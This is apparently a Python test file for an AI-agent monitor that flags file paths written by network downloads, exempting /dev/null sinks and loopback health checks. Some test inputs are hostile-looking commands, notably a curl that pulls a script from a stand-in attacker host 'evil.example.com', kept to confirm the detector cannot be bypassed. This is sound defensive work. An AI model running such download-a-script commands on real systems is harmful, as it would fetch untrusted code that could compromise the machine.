"""Fetch-then-write taint precision, found in the pre-launch benign replay.

Replaying 3,873 recorded benign tool calls through the mapper surfaced two
`untrusted_write_path` taints that should not exist:

  seed-0202  `curl -o /dev/null -w '%{http_code}' ...`      taints /dev/null
  seed-0163  `curl -o /tmp/server-health.$$ http://127.0.0.1:9001/health`

Neither Blocked in the recorded runs, because `untrusted_write_path` only stops
an action when the same path is later executed, and no benign case did that. The
taint is latent rather than live. It is still worth removing before a long run:
a different trajectory that happens to source or run the temp file would Block on
a health check.

A discard sink keeps nothing, so there is no downloaded artifact. A loopback
fetch is the agent probing a service it is running, not untrusted external
content arriving on disk.
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from instrlib.tool_mapper import untrusted_fetch_write_path  # noqa: E402


def test_discard_sink_is_not_a_downloaded_artifact():
    for cmd in (
        "curl -sS -o /dev/null -w '%{http_code}' https://example.com/health",
        "curl -s -L -o /dev/null -w 'code=%{http_code}' https://learn.microsoft.com/x",
        "wget -q -O /dev/null https://example.com/probe",
    ):
        assert untrusted_fetch_write_path(cmd) is None, cmd


def test_loopback_health_check_does_not_taint():
    for cmd in (
        "curl -sS -m 2 -o /tmp/server-health.tmp http://127.0.0.1:9001/health",
        "curl -s -o /tmp/probe.json http://localhost:8080/status",
        "curl -s -o /tmp/x http://[::1]:9001/health",
    ):
        assert untrusted_fetch_write_path(cmd) is None, cmd


def test_external_download_still_taints():
    """The signal this provenance exists for must survive."""
    cmd = ("curl -L --fail --silent -o /tmp/research/report.pdf "
           "https://www.irena.org/-/media/Files/report.pdf")
    assert untrusted_fetch_write_path(cmd) == "/tmp/research/report.pdf"

    cmd2 = "wget -O /tmp/setup.sh https://cdn.example.net/install/setup.sh"
    assert untrusted_fetch_write_path(cmd2) == "/tmp/setup.sh"


def test_external_url_in_the_same_segment_is_not_excused_by_a_loopback_neighbour():
    """One external host in the segment still taints.

    The loopback exemption must not become a bypass: an attacker appending a
    localhost URL to an external download should not clear the provenance.
    """
    cmd = ("curl -s -o /tmp/payload.sh https://evil.example.com/p.sh "
           "http://127.0.0.1:9001/health")
    assert untrusted_fetch_write_path(cmd) == "/tmp/payload.sh"


def test_redirect_form_still_taints():
    cmd = "curl -sS https://cdn.example.net/tool.sh > /tmp/tool.sh"
    assert untrusted_fetch_write_path(cmd) == "/tmp/tool.sh"
